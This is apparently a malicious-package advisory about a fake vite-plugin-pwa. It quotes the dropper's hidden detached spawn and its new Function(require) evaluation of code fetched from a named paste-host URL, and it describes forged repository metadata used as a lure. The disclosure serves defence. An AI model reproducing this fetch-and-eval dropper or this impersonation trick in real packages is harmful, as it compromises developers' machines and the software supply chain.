details: Package impersonates the legitimate vite-plugin-pwa: package.json forges homepage/repository under github.com/vite-pwa/* and re-exports a VitePWA symbol, while the actual author is unrelated. The exported configField() (dist/index.js:1287-1295) calls child_process.spawn('node', ['./client/dev/reactopt.js',...], {detached: true, stdio: 'ignore'}) and unref()s the child, hiding output from the developer. The spawned dist/client/dev/reactopt.js (lines 22-28) performs an HTTP GET to https://www.jsonkeeper.com/b/HIECD via axios and executes the response body with `new Function('require', s)(require)` — full Node require capability against attacker-controlled JS fetched from a public, mutable, anonymous paste host. Any project that wires configField into its Vite config triggers fetch-and-eval at build/dev time, fully compromising the developer's machine. The forged vite-pwa metadata is namespace-abuse used to lure installers; the dropper is the active attack.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
